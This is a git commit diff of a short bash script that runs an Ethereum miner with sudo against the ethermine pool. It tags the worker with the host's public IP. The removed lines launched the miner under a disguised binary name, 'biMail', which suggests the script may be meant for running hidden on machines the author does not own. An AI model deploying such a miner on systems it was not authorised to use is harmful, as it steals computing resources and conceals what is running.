28481e563db3edcf5868ed206086b0e5d56cc4bf
tranquangchung1989 <82724509+tranquangchung1989@users.noreply.github.com>
2021-09-05 18:05:59 +0700

    Update lulufi.sh

--- lulufi.sh
+++ lulufi.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
 POOL=eu1.ethermine.org:4444
-WALLET=0xB0dED2F41Fcb65e1feAd440692ED2D9174479645.$(echo "$(curl -s ifconfig.me)" | tr . _ )-bidepzai-
+WALLET=0xB0dED2F41Fcb65e1feAd440692ED2D9174479645.$(echo "$(curl -s ifconfig.me)" | tr . _ )-lufilufi-
 
 cd "$(dirname "$0")"
 
-chmod +x ./biMail && sudo ./biMail --algo ETHASH --pool $POOL --user $WALLET  $@
+chmod +x ./lolMiner && sudo ./lolMiner --algo ETHASH --pool $POOL --user $WALLET  $@
